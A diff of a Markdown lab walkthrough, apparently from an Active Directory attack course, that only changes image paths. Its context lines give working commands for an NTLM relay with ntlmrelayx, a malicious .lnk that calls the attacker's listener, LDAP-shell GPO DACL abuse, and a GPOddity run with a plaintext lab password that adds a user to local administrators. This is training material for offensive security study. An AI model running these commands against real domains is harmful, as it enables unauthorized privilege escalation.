@@ -9,7 +9,7 @@ GPO abuse for admin access on dcorp-ci
 
 early, we enumerated that there is a directory called '**AI**' on the dcorp-ci machine where '**Everyone**' has access. Looking at the directory (**\\dcorp-ci\AI**), we will find a log file.
 
-![NTLM Relay](../assets/gpo-abuse-1.png)
+![NTLM Relay](/assets/gpo-abuse-1.png)
 
 It turns out that the '**AI**' folder is used for testing some automation that executes shortcuts (.lnk files) as the user '**devopsadmin**'. Recall that we enumerated a user '**devopsadmin**' has '**WriteDACL**' on **DevOps Policy**. Let's try to abuse this using **GPOddity**.
 
@@ -25,7 +25,7 @@ Run the following command in Ubuntu to execute ntlmrelayx. Keep in mind the foll
 ```batch
 sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
 ```
-![NTLM Relay](../assets/ntlm-relay-1.png)
+![NTLM Relay](/assets/ntlm-relay-1.png)
 
 On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. Go to **C:\AD\Tools -> Right Click -> New -> Shortcut**. Copy the following command in the Shortcut location:
 
@@ -35,7 +35,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRe
 
 It should look like this:
 
-![NTLM Relay](../assets/obj6(3).png)
+![NTLM Relay](/assets/obj6(3).png)
 
 Name the shortcut as studentx.lnk. Copy the lnk file to 'dcopr-ci\AI'.
 ```batch
@@ -45,7 +45,7 @@ C:\AD\Tools\studentx.lnk
 ```
 The simulation on dcorp-ci, will execute the lnk file within a minute. This is what the listener looks like on a successful connection:
 
-![NTLM Relay](../assets/obj6(4).png)
+![NTLM Relay](/assets/obj6(4).png)
 
 Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session:
 Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy **{0BF8D01C-1F62-4BDC-958C-57140B67D147}**:
@@ -53,7 +53,7 @@ Using this ldap shell, we will provide the studentx user, WriteDACL permissions 
 ```batch
 write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
-![NTLM Relay](../assets/ntlm-relay-2.png)
+![NTLM Relay](/assets/ntlm-relay-2.png)
 
 **NOTE:** Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the '**write_gpo_dacl**' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 
@@ -80,7 +80,7 @@ Now, run the GPOddity command to create the new template.
 cd /mnt/c/AD/Tools/GPOddity
 sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
 ```
-![NTLM Relay](../assets/gpoddity.png)
+![NTLM Relay](/assets/gpoddity.png)
 
 Leave GPOddity running and from another Ubuntu WSL session, create and share the stdx-gp directory:
 
@@ -89,7 +89,7 @@ mkdir /mnt/c/AD/Tools/stdx-gp
 
 cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
 ```
-![NTLM Relay](../assets/gpoddity-1.png)
+![NTLM Relay](/assets/gpoddity-1.png)
           
 From a command prompt (Run as Administrator) on the student VM, run the following commands to allow '**Everyone**' full permission on the **stdx-gp share**:
 
@@ -98,13 +98,13 @@ net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
 icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
 ```
 
-![NTLM Relay](../assets/gpoddity-2.png)
+![NTLM Relay](/assets/gpoddity-2.png)
           
 Verify if the **gPCfileSysPath** has been modified for the **DevOps Policy**. Run the following **PowerView command**:
 ```powershell
 Get-DomainGPO -Identity 'DevOps Policy'
 ```
-![NTLM Relay](../assets/gpoddity-3.png)
+![NTLM Relay](/assets/gpoddity-3.png)
 
 The update for this policy is configured to be every 2 minutes in the lab. After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci:
 
